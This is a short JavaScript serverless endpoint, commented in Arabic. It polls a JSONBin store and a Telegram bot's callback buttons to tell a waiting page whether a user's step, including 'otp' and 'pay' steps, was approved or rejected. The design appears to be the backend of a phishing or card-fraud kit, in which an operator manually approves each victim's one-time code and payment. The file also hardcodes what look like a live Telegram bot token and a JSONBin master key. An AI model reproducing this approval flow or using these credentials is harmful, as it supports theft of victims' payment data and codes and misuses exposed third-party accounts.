export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method Not Allowed' });

  const { user_id } = req.query;
  if (!user_id) return res.status(200).json({ status: 'pending' });

  const BOT_TOKEN = "9264807725:AAEtg1bnRFmHq0MnOJu_WAlDQePrDI_Wxc4";
  const BIN_ID = "6af041a3ffd5d16053b0b102";
  const API_KEY = "$2a$10$KdTTWrgsRm/Rk01Njf6HmurDvGeNyAcYaUsLuCIWF20baDFcigsQ6";

  try {
    // 1. أولاً: فحص الحالة من سحابة JSONBin
    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
      headers: { 'X-Master-Key': API_KEY }
    });
    const currentData = await getRes.json();
    const record = currentData.record || {};

    let status = record[user_id] || record[`otp_${user_id}`] || 'pending';

    // 2. ثانياً: إذا كانت pending، نتحقق مباشرة من تيليجرام لضمان الانتقال الفوري عند الضغط
    if (status === 'pending') {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?allowed_updates=["callback_query"]`);
      const tgData = await tgRes.json();

      let callbackQueryId = null;
      if (tgData.ok && tgData.result) {
        for (let i = tgData.result.length - 1; i >= 0; i--) {
          const update = tgData.result[i];
          if (update.callback_query) {
            const data = update.callback_query.data;
            if (data === `approve_${user_id}` || data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) {
              status = 'approved';
              callbackQueryId = update.callback_query.id;
              break;
            } else if (data === `reject_${user_id}` || data === `reject_otp_${user_id}` || data === `reject_pay_${user_id}`) {
              status = 'rejected';
              callbackQueryId = update.callback_query.id;
              break;
            }
          }
        }
      }

      // تأكيد الضغطة لدى تيليجرام لتختفي علامة التحميل
      if (callbackQueryId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: callbackQueryId, text: "تم الانتقال بنجاح!" })
        }).catch(() => {});
      }
    }

    return res.status(200).json({ status });
  } catch (err) {
    return res.status(200).json({ status: 'pending' });
  }
}
